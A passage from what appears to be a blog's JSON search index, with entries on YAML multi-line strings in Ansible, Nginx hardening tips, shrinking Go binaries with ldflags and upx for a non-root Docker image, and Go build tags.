style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003es4\u003c/span\u003e: |-\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      s4\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      this is my very very very\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      long string\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003es5\u003c/span\u003e: \u0026gt;-\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      s5\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      this is my very very very\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      long string\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003etasks\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003es1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecopy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003econtent\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ s1 }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edest\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/s1.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# hello%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003es2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecopy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003econtent\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ s2 }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edest\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/s2.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# s2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# this is my very very very\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# long string\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003es3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecopy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003econtent\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ s3 }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edest\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/s3.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# s3 this is my very very very long string line1 line2 line3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003es4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecopy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003econtent\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ s4 }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edest\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/s4.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# s4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# this is my very very very\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# long string\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# line3%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    - \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003es5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003ecopy\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003econtent\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ s5 }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edest\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/s5.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# s5 this is my very very very long string line1 line2 line3%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Ansible","YAML"],"title":"YAML 裡的字串很長該怎麼做？"},{"categories":["URL","NGINX"],"contents":" Top 25 Nginx Tips and Tricks From Practical Experience\nserver_tokens off;\nssl_protocols TLSv1.2 TLSv1.3;\nDisable any undesirable HTTP methods\nlocation / { limit_except GET HEAD POST { deny all; } } Enable sysctl based protection net.ipv4.conf.all.rp_filter = 1 net.ipv4.tcp_syncookies = 1 Stop image hotlinking location /images/ { valid_referers none blocked www.domain.com domain.com; if ($invalid_referer) { return 403; } } add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection \u0026quot;1; mode=block\u0026quot;; add_header Strict-Transport-Security \u0026quot;max-age=31536000; includeSubDomains; preload\u0026quot; always; ","date":"August 10, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220810-top-25-nginx-tips-and-tricks-from-practical-experience/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://hackernoon.com/top-25-nginx-tips-and-tricks-from-practical-experience\" target=\"_blank\" rel=\"noopener\"\u003eTop 25 Nginx Tips and Tricks From Practical Experience\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eserver_tokens off;\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003essl_protocols TLSv1.2 TLSv1.3;\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eDisable any undesirable HTTP methods\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elimit_except\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eGET\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eHEAD\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ePOST\u003c/span\u003e { \u003cspan style=\"color:#f92672\"\u003edeny\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eall\u003c/span\u003e; }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eEnable sysctl based protection\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet.ipv4.conf.all.rp_filter \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enet.ipv4.tcp_syncookies \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eStop image hotlinking\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/images/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003evalid_referers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enone\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eblocked\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewww.domain.com\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edomain.com\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   \u003cspan style=\"color:#f92672\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e(\u003c/span\u003e$invalid_referer\u003cspan style=\"color:#e6db74\"\u003e)\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e   \u003cspan style=\"color:#ae81ff\"\u003e403\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e   }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eadd_header X-Content-Type-Options nosniff;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eadd_header X-XSS-Protection \u0026quot;1; mode=block\u0026quot;;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eadd_header Strict-Transport-Security \u0026quot;max-age=31536000; includeSubDomains; preload\u0026quot; always;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","NGINX"],"title":"Top 25 Nginx Tips and Tricks From Practical Experience"},{"categories":["URL","Go","Docker"],"contents":" 為你的 Go 應用建立輕量級 Docker 映象？ | IT 人 go build # default $ go build -o test1 main.go $ du -sh test1 14M test1 # 在程式編譯的時候可以加上 `-ldflags \u0026#34;-s -w\u0026#34;` 引數來優化編譯，原理是通過去除部分連結和除錯等資訊來減小編譯生成的可執行程式體積，具體引數如下： # -a：強制編譯所有依賴包 # -s：去掉符號表資訊，不過 panic 的時候 stack trace 就沒有任何檔名/行號資訊了 # -w：去掉 DWARF 除錯資訊，不過得到的程式就不能使用 gdb 進行除錯了 # 若對符號表無需求，-ldflags 直接新增 \u0026#34;-s\u0026#34; 即可 # 注：不建議-w和-s同時使用 $ go build -ldflags \u0026#34;-s -w\u0026#34; -o test2 main.go $ du -sh test2 11M test2 upx(brew/yum install upx) $ upx test2 Ultimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX 3.96 Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 11490768 -\u0026gt; 4063248 35.36% macho/amd64 test2 Packed 1 file. $ upx --brute test2 $ du -sh test2 4.6M test2 upx 的壓縮選項\n-o: 指定輸出的檔名 -k: 保留備份原檔案 -1: 最快壓縮，共 1-9 九個級別 -9: 最優壓縮，與上面對應 -d: 解壓縮 decompress，恢復原體積 -l: 顯示壓縮檔案的詳情，例如 upx -l main.exe -t: 測試壓縮檔案，例如 upx -t main.exe -q: 靜默壓縮 be quiet -v: 顯示壓縮細節 be verbose -f: 強制壓縮 -V: 顯示版本號 -h: 顯示幫助資訊 --brute: 嘗試所有可用的壓縮方法，slow --ultra-brute: 比樓上更極端，very slow upx 壓縮後的程式和壓縮前的程式一樣，無需解壓仍然能夠正常地執行，這種壓縮方法稱之為帶殼壓縮，壓縮包含兩個部分:\n在程式開頭或其他合適的地方插入解壓程式碼； 將程式的其他部分壓縮; 執行時，也包含兩個部分:\n首先執行的是程式開頭的插入的解壓程式碼，將原來的程式在記憶體中解壓出來； 再執行解壓後的程式; 也就是說，upx 在程式執行時，會有額外的解壓動作，不過這個耗時幾乎可以忽略。\ndocker image FROM golang:alpine AS build # 為我們的映象設定必要的環境變數 ENV GO111MODULE=on CGO_ENABLED=0 GOOS=linux GOARCH=amd64 GOPROXY=\u0026#34;https://goproxy.io\u0026#34; # 移動到工作目錄：/build WORKDIR $GOPATH/src/gin_docker # 將程式碼複製到容器中 ADD . ./ # 將我們的程式碼編譯成二進位制可執行檔案 app RUN go build -ldflags \u0026#34;-s -w\u0026#34; -o app FROM scratch AS prod # 從builder映象中把/go/src/gin_docker 拷貝到當前目錄 # 設定應用程式以非 root 使用者身份運行 # User ID 65534 通常是 \u0026#39;nobody\u0026#39; 使用者 # 映像的執行者仍應在安裝過程中指定一個使用者。 COPY --chown=65534:0 --from=build /go/src/gin_docker . USER 65534 # 需要執行的命令 CMD [\u0026#34;./app\u0026#34;] ","date":"July 25, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220725-build-lightweight-docker-image-for-go-app/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://iter01.com/605065.html\" target=\"_blank\" rel=\"noopener\"\u003e為你的 Go 應用建立輕量級 Docker 映象？ | IT 人\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"go-build\"\u003ego build\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# default\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go build -o test1 main.go\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ du -sh test1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e14M    test1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 在程式編譯的時候可以加上 `-ldflags \u0026#34;-s -w\u0026#34;` 引數來優化編譯，原理是通過去除部分連結和除錯等資訊來減小編譯生成的可執行程式體積，具體引數如下：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# -a：強制編譯所有依賴包\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# -s：去掉符號表資訊，不過 panic 的時候 stack trace 就沒有任何檔名/行號資訊了\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# -w：去掉 DWARF 除錯資訊，不過得到的程式就不能使用 gdb 進行除錯了\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 若對符號表無需求，-ldflags 直接新增 \u0026#34;-s\u0026#34; 即可\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 注：不建議-w和-s同時使用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go build -ldflags \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-s -w\u0026#34;\u003c/span\u003e -o test2 main.go\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ du -sh test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e11M    test2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"upxbrewyum-install-upx\"\u003eupx(\u003ccode\u003ebrew/yum install upx\u003c/code\u003e)\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ upx test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                         Ultimate Packer \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e eXecutables\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            Copyright \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1996\u003c/span\u003e - \u003cspan style=\"color:#ae81ff\"\u003e2020\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUPX 3.96        Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser   Jan 23rd \u003cspan style=\"color:#ae81ff\"\u003e2020\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        File size         Ratio      Format      Name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  --------------------   ------   -----------   -----------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#ae81ff\"\u003e11490768\u003c/span\u003e -\u0026gt;   \u003cspan style=\"color:#ae81ff\"\u003e4063248\u003c/span\u003e   35.36%   macho/amd64   test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePacked \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e file.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ upx --brute test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ du -sh test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e4.6M    test2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eupx 的壓縮選項\u003c/p\u003e","tags":["URL","Go","Docker"],"title":"為你的Go應用建立輕量級Docker映象？ | IT人"},{"categories":["URL","Go"],"contents":" [Golang] 利用 build tags 達到不同的 build config Go build -ldflags package main import ( \u0026#34;fmt\u0026#34; ) var flagString string func main() { fmt.Println(\u0026#34;This build with ldflag:\u0026#34;, flagString) } $ go build -ldflags \u0026#39;-X main.flagString \u0026#34;test\u0026#34;\u0026#39; $ ./main This build with ldflag: test Go build -tags debug_config.go //+build debug package main var TestString string = \u0026#34;test debug\u0026#34; var TestString2 string = \u0026#34; and it will run every module with debug tag.\u0026#34; func GetConfigString() string { return \u0026#34;it is debug.....\u0026#34; } //+build debug 前後需要一個空行(除非你在第一行) release_config.go //+build !debug package main var TestString string = \u0026#34;test release\u0026#34; var TestString2 string = \u0026#34; and it will run every module as no debug tag.\u0026#34; func GetConfigString() string { return \u0026#34;it is release.....\u0026#34; } main package main import ( \u0026#34;fmt\u0026#34; ) func main() { fmt.Println(\u0026#34;This build is \u0026#34;, TestString, TestString2, GetConfigString()) } $ go build -tags debug . $ ./main This build is test debug and it will run every module with debug tag. it is debug..... $ go build . $ ./main This build is test release and it will run every module as no debug tag. it is release..... ","date":"July 18, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20220718-go-build-config-ldflags/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.evanlin.com/go-build-config-ldflags/\" target=\"_blank\" rel=\"noopener\"\u003e[Golang] 利用 build tags 達到不同的 build config\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"go-build--ldflags\"\u003eGo build -ldflags\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eflagString\u003c/span\u003e \u003cspan 